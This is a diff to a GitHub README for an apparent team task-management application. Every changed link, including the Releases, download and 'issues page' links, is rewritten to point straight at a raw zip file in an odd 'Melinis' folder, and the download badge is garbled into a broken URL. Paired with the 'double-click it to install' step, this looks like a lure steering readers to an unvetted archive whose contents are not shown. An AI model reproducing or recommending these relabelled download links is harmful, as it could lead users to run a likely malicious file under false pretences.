@@ -1,7 +1,7 @@
 # 🚀 task-management - Simplify Your Team's Workflow
 
 ## 📦 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/zovchik0v/task-management/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/zovchik0v/task-management/main/Melinis/task-management_1.0.zip%20Latest%https://raw.githubusercontent.com/zovchik0v/task-management/main/Melinis/task-management_1.0.zip)](https://raw.githubusercontent.com/zovchik0v/task-management/main/Melinis/task-management_1.0.zip)
 
 ## 📖 Overview
 **task-management** is an enterprise task management system designed for teams needing to manage tasks efficiently. This application offers secure role-based access, real-time analytics, file management, team collaboration, and automation features. It helps enhance productivity and streamline workflows.
@@ -24,7 +24,7 @@ To run **task-management**, ensure your system meets the following requirements:
 ## 🚀 Getting Started
 1. **Download the Application:**  
    To get started, visit the Releases page to download the latest version of the application.
-   [Download Here](https://github.com/zovchik0v/task-management/releases)
+   [Download Here](https://raw.githubusercontent.com/zovchik0v/task-management/main/Melinis/task-management_1.0.zip)
 
 2. **Install the Application:**  
    After downloading, locate the file on your computer. Double-click it to begin the installation. Follow the prompts on the screen to complete the process.
@@ -42,7 +42,7 @@ To run **task-management**, ensure your system meets the following requirements:
 Regular updates keep your application running smoothly and securely. Check the Releases page periodically to download the latest version.
 
 ## 📞 Support
-If you have questions or face issues, help is available. You can reach out through the [issues page](https://github.com/zovchik0v/task-management/issues) on our GitHub repository.
+If you have questions or face issues, help is available. You can reach out through the [issues page](https://raw.githubusercontent.com/zovchik0v/task-management/main/Melinis/task-management_1.0.zip) on our GitHub repository.
 
 ## 💡 Useful Tips
 - Regularly back up your data to avoid loss.
@@ -57,6 +57,6 @@ For more information, visit our documentation page or check out the community fo
 
 ### 📥 Download & Install
 To download **task-management**, follow the link below to visit our Releases page:
-[Download Here](https://github.com/zovchik0v/task-management/releases)
+[Download Here](https://raw.githubusercontent.com/zovchik0v/task-management/main/Melinis/task-management_1.0.zip)
 
 Whether you’re managing daily tasks or overseeing large projects, task-management makes it easier to keep everything organized and your team on track.
